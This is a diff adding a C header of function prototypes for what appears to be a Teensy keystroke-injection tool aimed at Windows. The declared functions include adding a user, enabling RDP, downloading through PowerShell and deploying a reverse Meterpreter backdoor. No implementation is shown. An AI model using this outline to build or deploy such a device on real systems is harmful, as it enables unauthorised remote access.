@@ -1,0 +1,42 @@
+/*
+ * main.h
+ *
+ *  Created on: Jan 10, 2017
+ *      Author: eroach
+ */
+
+#ifndef SRC_MAIN_H_
+#define SRC_MAIN_H_
+
+
+// Function prototypes
+int ledkeys(void);
+bool is_scroll_on(void);
+bool is_caps_on(void);
+bool is_num_on(void);
+void wait_for_drivers(unsigned int speed);
+void unpress_key(void);
+void blink_fast(int blinkrate,int delaytime);
+void alt_y(void);
+bool secure_prompt(int reps, int millisecs);
+bool check_for_numlock_sucess_teensy(int reps, int millisecs);
+void secure_prompt_fallback(int reps, int millisecs);
+void create_click_numlock_win();
+void add_user(char *username,char *password);
+void enable_rdp(void);
+bool download_powershell(char *url,char *localfile,int reps, int millisecs);
+void inline_reverse_meterpreter(bool arch,int ip1,int ip2,int ip3, int ip4, unsigned short port );
+void meterpreter_backdoor_deploy(bool arch,int a,int b,int c,int d,unsigned short port);
+void minimise_windows(void);
+void reset_windows_desktop(int sleep);
+void press_numlock(void);
+void make_sure_numlock_is_off(void);
+bool check_for_internet(char *url,int reps, int millisecs);
+bool check_for_powershell(int reps, int millisecs);
+bool check_windows_arch_vbscript(int reps, int millisecs);
+bool check_windows_arch_powershell(int reps, int millisecs);
+void pwnwindows(void);
+void setup(void);
+void loop(void);
+
+#endif /* SRC_MAIN_H_ */
